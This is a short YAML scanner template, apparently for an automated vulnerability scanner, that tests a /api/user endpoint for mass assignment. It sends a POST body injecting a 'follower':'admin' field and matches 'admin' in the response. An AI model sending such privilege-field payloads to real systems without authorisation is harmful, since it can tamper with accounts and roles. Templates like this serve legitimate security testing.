id: mass3-074
name: 'Mass field follower'
severity: high
type: active
tags:
  - mass-assignment
  - auth
  - api
description: 'Unfiltered follower on /api/user'
requests:
  - method: POST
    path: '{{BaseURL}}/api/user'
    body: '{"name":"u1","follower":"admin"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
